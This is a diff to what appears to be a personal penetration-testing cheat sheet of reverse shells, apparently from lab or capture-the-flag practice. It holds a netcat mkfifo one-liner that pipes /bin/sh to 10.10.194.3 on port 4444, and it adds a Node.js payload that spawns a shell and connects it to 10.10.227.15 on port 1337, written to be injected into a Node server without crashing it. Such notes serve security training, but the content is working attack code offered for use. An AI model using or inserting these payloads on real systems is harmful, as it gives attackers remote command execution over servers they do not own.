@@ -46,6 +46,23 @@ Netcat when you dont have the -e option (this actually worked once when the othe
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.194.3 4444 >/tmp/f`
 
+Node reverse shell, if you can get this included on a nodejs server:
+
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1337, "10.10.227.15", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+```
+
 ## shell tricks
 
 making a bad reverse shell better:
